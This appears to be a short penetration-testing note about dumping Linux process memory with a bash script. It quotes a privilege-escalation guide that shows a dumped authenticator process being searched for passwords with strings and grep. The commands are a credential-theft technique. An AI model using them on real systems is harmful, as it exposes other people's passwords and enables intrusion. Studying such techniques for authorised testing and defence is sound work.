--------------------

https://github.com/hajzer/bash-memory-dump

memory_dump.sh

memory_dump2.sh - Without Color for not has $TERM variable(terminal variable) where is Linux machines.

Usage

Usage: memory-dump.sh [options]
       -p PID              Dump memory region of the process which is specified by PID.
       -m MEMORY_REGION    Dump memory region of process (stack, heap, anon, all).
       -d DUMP_METHOD      Dump memory method for dumping (gdb, dd).
       -v                  Show script version.

-------------------

It can be use password extraction from process at Linux enviroments.


https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory

Manual example

If you find that the authenticator process is running:

ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator

You can dump the process (see before sections to find different ways to dump the memory of a process) and search for credentials inside the memory:

./dump-memory.sh 2027
strings *.dump | grep -i password

-------------------